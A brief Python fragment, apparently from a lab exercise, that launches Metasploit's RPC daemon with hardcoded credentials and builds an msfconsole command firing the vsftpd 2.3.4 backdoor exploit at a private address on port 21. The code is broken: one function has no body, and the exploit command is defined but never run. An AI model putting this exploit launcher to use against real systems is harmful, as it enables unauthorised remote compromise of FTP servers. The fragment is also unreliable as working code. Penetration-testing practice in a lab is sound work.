import subprocess
def run_metasploit():
def uygulama1():
    msfrpcd_cmd = "msfrpcd -P toor -U msf -f"
    subprocess.Popen(msfrpcd_cmd, shell=True)
    msfconsole_cmd = "msfconsole -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.75.137; set RPORT 21; exploit'"
